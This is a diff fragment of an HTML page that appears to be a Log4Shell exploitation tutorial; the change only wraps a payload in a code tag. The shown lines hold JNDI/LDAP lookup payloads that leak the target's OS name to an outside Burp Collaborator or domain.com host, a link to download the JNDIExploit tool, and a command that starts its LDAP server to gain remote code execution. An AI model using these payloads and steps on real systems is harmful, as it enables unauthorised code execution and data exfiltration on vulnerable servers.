@@ -302,7 +302,7 @@ ${jndi:ldap://${main:bar}.domain.com/j}
                                                        
                     <h2>5.<u>Exploitaion</u></h2><br>
 <p> 
-1. Before RCE, Make sure and try to get the Java version and os name of the target. For getting os name, we’ll use this payload: ${jndi:ldap://${sys:os.name}.xyz.burpcollaborator.net/a}<br><br>
+1. Before RCE, Make sure and try to get the Java version and os name of the target. For getting os name, we’ll use this payload: <code>${jndi:ldap://${sys:os.name}.xyz.burpcollaborator.net/a}</code><br><br>
 2. Now download this zip file in your instance and unzip it.<a href="https://anonfiles.com/xd07G204v9/JNDIExploit.v1.2_zip">Here</a><br><br>
 3. Start the LDAP server<br><br>
     <code>java -jar JNDIExploit-1.2-SNAPSHOT.jar -i YOUR_PUBLIC_IP -p 8888</code><br><br>
